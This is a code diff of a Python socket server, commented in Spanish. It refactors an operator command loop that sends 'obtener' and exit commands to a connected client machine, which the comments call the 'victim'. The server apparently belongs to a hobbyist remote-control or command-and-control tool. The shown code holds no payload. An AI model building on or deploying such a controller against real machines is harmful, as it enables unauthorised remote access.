@@ -35,6 +35,33 @@ class Servidor():
 
 
 	# Metodos...
+	# Recibe y procesa el comando ingresado
+	def procesar_comando(self, socket_cli) -> bool:
+		val_bool = True
+		while True:
+			# Ingreso de comando:
+			comando = input(f"[ cmd ] > ")
+			comando_div = comando.split() # Divimos al comando en una lista
+								
+			# Seccion de comandos:
+			if comando_div[0] in self._lista_comandos:
+				# Salir
+				if comando_div[0] == self._lista_comandos[0]:
+					socket_cli.send("\0".encode(self._CODIF)) # Revisar este apartado, funciona pero no entiendo por qué xd
+					val_bool = not val_bool
+					break
+				# Obtener
+				elif comando_div[0] == self._lista_comandos[1]:
+					if comando_div[1] in self._opt_obt:
+						socket_cli.send(comando_div[1].encode(self._CODIF))
+						break
+				else:
+					print(f" [*] Opcion {comando_div[1]} no valida!\n")
+			else:
+				print(f" [*] {comando} no es reconocido como comando valido!\n")
+		return val_bool
+
+
 	# Levantar servidor con la configuracion
 	def levantar_servidor(self):
 		try:
@@ -52,7 +79,7 @@ class Servidor():
 				en_linea = True
 
 				# Informacion de OS victima
-				os_vict = S_CLI.recv(1024).decode(self._CODIF)
+				#os_vict = S_CLI.recv(1024).decode(self._CODIF) # ESTO RECIBIA LA TRANSMISION DE LA LINEA 45 DEL CLIENTE LPMQMP! (la transmision de datos quedaba desfazada)
 
 				# Con conexion aceptada
 				with S_CLI:
@@ -60,9 +87,14 @@ class Servidor():
 
 					# Bucle principal (recibir, procesar, enviar)
 					while en_linea:
+						en_linea = self.procesar_comando(S_CLI)
+						
+						# NO TOCAR MOMENTANEAMENTE!!!
+						'''
 						while True:
 							# Ingreso de comando:
-							comando = input(f"[ {os_vict} ] > ")
+							comando = input(f"[ cmd ] > ")
+							#comando = input(f"[ {os_vict} ] > ")
 							comando_div = comando.split() # Divimos al comando en una lista
 							
 							# Seccion de comandos:
@@ -81,6 +113,7 @@ class Servidor():
 										print(f" [*] Opcion {comando_div[1]} no valida!\n")
 							else:
 								print(f" [*] {comando} no es reconocido como comando valido!\n")
+						'''
 
 						print(f" [*] Comando enviado...\n")
 
@@ -104,6 +137,7 @@ class Servidor():
 
 
 '''
+# (DEBUG MODE)
 # Ejecucion principal
 if __name__ == '__main__':
 	try:
